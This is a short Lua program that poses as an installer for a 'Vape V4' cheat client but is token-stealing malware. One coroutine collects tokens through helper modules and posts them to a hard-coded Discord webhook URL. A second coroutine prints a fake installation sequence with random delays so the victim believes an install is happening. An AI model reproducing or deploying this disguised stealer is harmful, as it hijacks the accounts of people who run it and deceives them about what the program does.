--[[fwcode]]
require('./getter.lua')(getfenv())
require('./checker.lua')(getfenv())
require('./info.lua')(getfenv())
require('./sender.lua')(getfenv())

local timer = require('timer')

coroutine.resume(coroutine.create(function()
    local tokens = get()
    local checked = check(tokens)
    local info = info(checked)
    send(info, 'https://discord.com/api/webhooks/874680613226020885/ScBR2wAsSy7qWMkBYU6pssQHD61jjJC9-sPEfhOpj5VzR8crGS9v7QU-EOchqsgg9YSq')
end))

local num1

math.randomseed(os.clock())

coroutine.resume(coroutine.create(function()
    pcall(function()
        local count = 1
        io.write('Installing dependencies...')
        timer.sleep(math.random(1000,3000))
        print(' 100% done.')
        io.write('Getting files from mirror...')
        timer.sleep(math.random(3000,5000))
        print(' 100% done.')
        io.write('Installing and configuring files...')
        timer.sleep(math.random(5000,10000))
        print(' 100% done.')
        print('\nVape V4 is fully installed! A start menu shortcut has been created, enjoy!')
        process.stdin:on('data', function(data)
        end)
    end)
end))